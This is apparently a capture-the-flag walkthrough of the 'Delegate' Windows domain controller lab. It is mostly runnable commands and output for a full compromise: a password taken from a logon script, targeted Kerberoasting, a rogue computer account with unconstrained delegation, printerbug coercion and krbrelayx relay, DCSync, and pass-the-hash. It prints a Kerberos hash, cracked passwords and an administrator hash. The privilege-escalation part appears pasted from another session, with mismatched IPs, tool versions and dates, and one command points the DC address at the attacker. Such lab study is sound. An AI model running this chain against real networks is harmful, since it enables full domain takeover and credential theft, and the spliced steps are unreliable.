---
tags:
  - Windows
  - HTB
  - Hacking
  - Boot2Root
---
# Overview

| Name        | Delegate |
| ----------- | -------- |
| OS          | Windows  |
| Base Points | Medium   |
| Status      | Done     |
# Recon
## Nmap

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ sudo nmap -sC -sV -T4 10.129.20.176
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-01 22:53 CST
Nmap scan report for 10.129.20.176
Host is up (0.25s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-02 04:53:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-01-01T04:49:12
|_Not valid after:  2026-07-03T04:49:12
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-02T04:53:55+00:00
|_ssl-date: 2026-01-02T04:54:34+00:00; -3s from scanner time.
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -3s
| smb2-time: 
|   date: 2026-01-02T04:53:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
# Enumeration

```bash
10.129.20.176 DC1.delegate.vl delegate.vl DC1
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ impacket-lookupsid anonymous@delegate.vl
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at delegate.vl
[*] StringBinding ncacn_np:delegate.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1484473093-3449528695-2030935120
498: DELEGATE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: DELEGATE\Administrator (SidTypeUser)
501: DELEGATE\Guest (SidTypeUser)
502: DELEGATE\krbtgt (SidTypeUser)
512: DELEGATE\Domain Admins (SidTypeGroup)
513: DELEGATE\Domain Users (SidTypeGroup)
514: DELEGATE\Domain Guests (SidTypeGroup)
515: DELEGATE\Domain Computers (SidTypeGroup)
516: DELEGATE\Domain Controllers (SidTypeGroup)
517: DELEGATE\Cert Publishers (SidTypeAlias)
518: DELEGATE\Schema Admins (SidTypeGroup)
519: DELEGATE\Enterprise Admins (SidTypeGroup)
520: DELEGATE\Group Policy Creator Owners (SidTypeGroup)
521: DELEGATE\Read-only Domain Controllers (SidTypeGroup)
522: DELEGATE\Cloneable Domain Controllers (SidTypeGroup)
525: DELEGATE\Protected Users (SidTypeGroup)
526: DELEGATE\Key Admins (SidTypeGroup)
527: DELEGATE\Enterprise Key Admins (SidTypeGroup)
553: DELEGATE\RAS and IAS Servers (SidTypeAlias)
571: DELEGATE\Allowed RODC Password Replication Group (SidTypeAlias)
572: DELEGATE\Denied RODC Password Replication Group (SidTypeAlias)
1000: DELEGATE\DC1$ (SidTypeUser)
1101: DELEGATE\DnsAdmins (SidTypeAlias)
1102: DELEGATE\DnsUpdateProxy (SidTypeGroup)
1104: DELEGATE\A.Briggs (SidTypeUser)
1105: DELEGATE\b.Brown (SidTypeUser)
1106: DELEGATE\R.Cooper (SidTypeUser)
1107: DELEGATE\J.Roberts (SidTypeUser)
1108: DELEGATE\N.Thompson (SidTypeUser)
1121: DELEGATE\delegation admins (SidTypeGroup)
```

We also get the Domain SID:

`Domain SID is: S-1-5-21-1484473093-3449528695-2030935120`

We don't have credentials for any of these accounts. From here we could try a password spray, but lets keep enumerating and keep that in mind for later.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ crackmapexec smb delegate.vl -u 'anonymous' -p '' --shares
SMB         10.129.20.176   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.20.176   445    DC1              [+] delegate.vl\anonymous: 
SMB         10.129.20.176   445    DC1              [*] Enumerated shares
SMB         10.129.20.176   445    DC1              Share           Permissions     Remark
SMB         10.129.20.176   445    DC1              -----           -----------     ------
SMB         10.129.20.176   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.20.176   445    DC1              C$                              Default share
SMB         10.129.20.176   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.20.176   445    DC1              NETLOGON        READ            Logon server share 
SMB         10.129.20.176   445    DC1              SYSVOL          READ            Logon server share 
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ smbclient //delegate.vl/NETLOGON -U 'anonymous'
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 26 07:45:24 2023
  ..                                  D        0  Sat Aug 26 04:45:45 2023
  users.bat                           A      159  Sat Aug 26 07:54:29 2023
c
		4652287 blocks of size 4096. 1095016 blocks available
smb: \> get users.bat 
getting file \users.bat of size 159 as users.bat (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ cat users.bat 
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ crackmapexec smb delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123'
SMB         10.129.20.176   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.20.176   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ ldapsearch -x -H ldap://delegate.vl  -D 'A.Briggs@delegate.vl' -w 'P4ssw0rd1#123' -b 'DC=delegate,DC=vl' "(objectClass=user)" "*" | grep sAMAccountName | cut -d " " -f 2
Administrator
Guest
DC1$
krbtgt
A.Briggs
b.Brown
R.Cooper
J.Roberts
N.Thompson
```

```bash
$ bloodhound-python -d delegate.vl -v --zip -c All -dc DC1.delegate.vl -ns 10.129.20.176 -u 'A.Briggs' -p 'P4ssw0rd1#123'
```

We import the Bloodhound data, mark the user `A.Briggs` as owned and start analysing the attack path.

![[Delegate.png]]

The user "A.BRIGGS" has generic write access to the user "N.THOMPSON".  
From the perspective of the attacker, the compromised user "A.BRIGGS" can abuse this to add a new SPN to the user "N.THOMPSON" and kerberoast that account.
# Initial Foothold
## Kerberoasting

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 76 (delta 19), reused 18 (delta 14), pack-reused 43 (from 1)
Receiving objects: 100% (76/76), 252.27 KiB | 1.33 MiB/s, done.
Resolving deltas: 100% (30/30), done.
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$  cd targetedKerberoast
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/targetedKerberoast]
└──╼ [★]$ python targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$98bbbb51b1359b351897928cba40ba99$f1e1f40e8b888faf872f05a552c3a8c9d4ab34c2cf04213b9e19c21abe4fcb071661285d7dfabf225dc6780fab44c396075d902eeddfcd2d463837ca18994ad6a4d8d10ea18be3c18a54d3aac6f8f8362195408b12abc2fa310ab44350282d43d335c773bda46f0c12759c1b1ceb80df290cb4d5ac14fe0dd5ddbeaa37abda3e31e8d223e8c9858c8fed83caa29a2f4bfaceae389b9b5792d6dd7dadbc4db689b74af03deb6ad6a45227d4187e8b6b17b9112a9005b49b6920c9363f8744c4ba8614e8aad149d3be463536514ed66297aeb3c506fbec0e2d42da6ad84f01d025e46a11d3479aedd80fbad300092c2b729dba481b62e7d13fe92f9f846db40f736bce75755460a970a1b557806dfd9cd7f864bf62c0651d01fa07afedf0cd4a50279f4d1eab104289639455efdd0b7aad4dd90c2282642e0a39736b0809155edb013177ad53800624e9e812a5a908bd7cfedf671d6d6ba4bc733276ead4388f4205b3aafb57430d9a17c078ac132b20ce3513aa29dc4b0b1b17ac2e45a19303a3b57fb2a522644bd38bdcd5a8e30ed7d8b52587f6f7b992b80acc39721ce12372c562bc6168e1c64b9b26674731ef449cf49aa752fc0e0739ecc0792459f7933fd02a3974079568317babd990aeba1f61a5159fe463acd2a74821909d844adc3e387176718e3512d9b160d09c45b9389169aca2dd5c892b5744013095e5b1e671853fc7bca98296469dca33545a28abe5d8f37c0c8daad725e5158cef85b516b5a1a0ef2d5d4ac147649621d909491baa1d6b7f54933ab477e7a68e08355f937c8ea8c472e8f0827b6db2062a4c513648ca5a55e7a58f645ec565b2f7105cdc13bb5732f830dd2e1e792729d288b14246e54ea87549ecdf4bdfc6ef8fe7239f4fbe34cf22db55e73a0687a8ec40b6149d70bc3828596e24814486514893856c58d2af0594bdba7ff05e4df76b2c3d2e8179c8c467405c06a47370a5ea87cd11a8ea3e5632a9740c1a2ee1097a5e38c5f8d4d1414fbb983e2e6fe8c1206de109d6a8c9ac807ebedebf315f2a3936e699b4d041368d7611f3439d0f936678a721d7b3480a82a3289f0282cc4c299cbc3dfe722ac112388b6e2cbea233be62f5931ac8827aa7fd2c8ad0e8e895a192050c93c91bb460359340b21bf9c62f59692cd1b38f247d32d565a80d81e5d680c683db6e37835b6e36782efae4ff69b466aede0d6b5e0f7df194d702ac4c5d410e63010c20fc18c506b6ad7d66d67c819b0756bb4c6531e5123693059fd1bc0925b0638d385a3bf5073ee112a23a24585e2980d0e59558c96e8e14761bb0d0be45320bc1b397b9a4d4bc6b1fb1e688fa44b83c06182c2fd930411fd26615bdc1ad05911b585d692e193b4d85f6c0704b43913c928c3568486f5aa249f40d08091b3c43e6e05863af427c89c52fda0e19adb9bc873929d8
[VERBOSE] SPN removed successfully for (N.Thompson)
```

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

We get password `KALEB_2341`.

```bash
evil-winrm -i delegate.vl -u 'N.Thompson' -p 'KALEB_2341'
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/targetedKerberoast]
└──╼ [★]$ evil-winrm -i delegate.vl -u 'N.Thompson' -p 'KALEB_2341'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cat ..\Desktop\user.txt
51d8a49ed6d4e9c7a00eded24cdef455
```
# Privilege Escalation

```bash
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ==============================================
delegate\n.thompson S-1-5-21-1484473093-3449528695-2030935120-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
DELEGATE\delegation admins                  Group            S-1-5-21-1484473093-3449528695-2030935120-1121 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
## Relay Kerberoas - Unconstrained Delegation

From a simple `whoami /all` we can see a possible attack vector, unconstrained delegation:

1. User is member of the group "Delegation Admins"
2. User has the privileges "SeMachineAccountPrivilege" and "SeEnableDelegationPrivilege" which allow adding workstations to the domain and enabling computer and user accounts to be trusted for delegation

For this attack I will be following [this article](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit) called "Relaying Kerberos - Having fun with unconstrained delegation" written by Dirk-jan Mollema.

Based on the article, here are the requirements for the attack:

1. Control over an account with unconstrained delegation privileges
2. Permissions to modify the servicePrincipalName attribute of that account
3. Permissions to add/modify DNS records
4. A way to connect victim users/computers to us

Since the compromised user "N.THOMSPON" have the privileges to create workstations and enable delegation, we just need to check the MachineAccountQuota:

```bash
> crackmapexec ldap delegate.vl -u 'N.Thompson' -p 'KALEB_2341' -M maq

SMB         DC1.delegate.vl 445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
LDAP        DC1.delegate.vl 389    DC1              [+] delegate.vl\N.Thompson:<redacted>
MAQ         DC1.delegate.vl 389    DC1              [*] Getting the MachineAccountQuota
MAQ         DC1.delegate.vl 389    DC1              MachineAccountQuota: 10
```

Great! We can add up to 10 machines in the domain.  
To summarize, the attack we will be doing the following:

1. Create a new "evil" machine in the domain
2. Set the UserAccountControl property in the evil machine to allow unconstrained delegation
3. Add a new DNS record in the DC1 that points to our attacker machine
4. Add a SPN matching the DNS record to the evil machine machine
5. Use the printerbug to coerce the DC to authenticate to our evil machine
6. Use the tool krbrelayx to "relay" the Kerberos authentication

The easiest way to add a new computer to the domain is by using one of these tools: PowerMad, SharpMad, impacket-addcomputer.

```bash
> addcomputer.py -dc-ip 10.129.20.176 -computer-pass 'Password123!2023' -computer-name evilcomputer delegate.vl/N.Thompson:'KALEB_2341'

Impacket v0.11.0 - Copyright 2023 Fortra
[*] Successfully added machine account evilcomputer$ with password Password123!2023.
```

Next, we have to enable unconstrained delegation in the `evilcomputer`. We can do that remotely using BloodyAD:

```bash
bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host 'DC1.delegate.vl' add uac 'evilcomputer$' -f TRUSTED_FOR_DELEGATION
```

We can use the [krbrelayx toolkit](https://github.com/dirkjanm/krbrelayx) developed by Dirk-jan to perform the next tasks.  
Add a DNS record for the evilmachine account we created:

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ git clone https://github.com/dirkjanm/krbrelayx.git
Cloning into 'krbrelayx'...
remote: Enumerating objects: 245, done.
remote: Counting objects: 100% (120/120), done.
remote: Compressing objects: 100% (46/46), done.
remote: Total 245 (delta 96), reused 74 (delta 74), pack-reused 125 (from 1)
Receiving objects: 100% (245/245), 105.76 KiB | 2.94 MiB/s, done.
Resolving deltas: 100% (141/141), done.
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~]
└──╼ [★]$ cd krbrelayx
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/krbrelayx]
└──╼ [★]$ ifconfig
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 159.89.166.230  netmask 255.255.240.0  broadcast 159.89.175.255
        inet6 fe80::a496:72ff:fe78:c96f  prefixlen 64  scopeid 0x20<link>
        ether a6:96:72:78:c9:6f  txqueuelen 1000  (Ethernet)
        RX packets 80103  bytes 15668695 (14.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 63714  bytes 152485380 (145.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens4: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.122.2.203  netmask 255.255.240.0  broadcast 10.122.15.255
        inet6 fe80::30fa:a5ff:fe00:4a75  prefixlen 64  scopeid 0x20<link>
        ether 32:fa:a5:00:4a:75  txqueuelen 1000  (Ethernet)
        RX packets 16  bytes 1714 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 57  bytes 7228 (7.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 145680  bytes 155215951 (148.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 145680  bytes 155215951 (148.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.15.108  netmask 255.255.254.0  destination 10.10.15.108
        inet6 fe80::39ae:73e0:fbdd:54eb  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::116a  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 5102  bytes 2323882 (2.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6832  bytes 799419 (780.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-zclxc6jlkl]─[~/krbrelayx]
└──╼ [★]$ python3 dnstool.py -u 'delegate.vl\evilcomputer$' -p 'Password123!2023' -r evilcomputer.delegate.vl -d 10.10.15.108 --action add DC1.delegate.vl -dns-ip 10.129.20.176
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

`10.10.15.108` is my attacker IP.

In step 4, we need to add an additional SPN via `msDS-AdditionalDnsHostName` to our evilcomputer:

```bash
# Check the SPN records
> python addspn.py -u delegate\\N.Thompson -p 'KALEB_2341' -s HOST/attacker.delegate.vl -q dc1.delegate.vl -t 'evilcomputer$' -dc-ip 10.10.15.108
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=evilcomputer,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2023-11-12T00:57:23.943939
    sAMAccountName: evilcomputer$

# Add SPN pointing to evilcomputer.delegate.vl
## Adding CIFS
> python addspn.py -u delegate\\N.Thompson -p 'KALEB_2341' -s CIFS/evilcomputer.delegate.vl dc1.delegate.vl -t 'evilcomputer$' -dc-ip 10.129.20.176 --additional
## Adding HOSTS
> python addspn.py -u delegate\\N.Thompson -p 'KALEB_2341' -s HOST/evilcomputer.delegate.vl dc1.delegate.vl -t 'evilcomputer$' -dc-ip 10.129.20.176 --additional

# Check the SPN records again
> python addspn.py -u delegate\\N.Thompson -p '<redacted>' -s HOST/attacker.delegate.vl -q dc1.delegate.vl -t 'evilcomputer$' -dc-ip 10.10.88.149
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=evilcomputer,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2023-11-12T00:57:23.943939
    sAMAccountName: evilcomputer$
    msDS-AdditionalDnsHostName: evilcomputer.delegate.vl
    servicePrincipalName: CIFS/evilcomputer.delegate.vl
```

We can confirm that the DNS entry is working:

```bash
# We need the NTLM hash of the password for evilcomputer account
> iconv -f ASCII -t UTF-16LE <(printf 'Password123!2023') | openssl dgst -md4
MD4(stdin)= f2d0c0e145e8323b97cec00272d7fa01

> python krbrelayx.py -hashes :f2d0c0e145e8323b97cec00272d7fa01
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
```

```bash
> python printerbug.py -hashes :F2D0C0E145E8323B97CEC00272D7FA01 delegate.vl/evilcomputer\$@dc1.delegate.vl evilcomputer.delegate.vl

[*] Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

```bash
[*] SMBD: Received connection from 10.10.88.149
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

We can simply DCSYNC the domain controller using the ticket and login with the NTLM hash of the Administrator:

```bash
> export KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'
> secretsdump.py -k dc1.delegate.vl -just-dc

Impacket v0.11.0 - Copyright 2023 Fortra
                                                                                                                        
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:<redacted>:::   
evilcomputer$:3101:aad3b435b51404eeaad3b435b51404ee:f2d0c0e145e8323b97cec00272d7fa01:::
...<snip>...

> evil-winrm -i dc1.delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee93
Evil-WinRM shell v3.5                                         
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---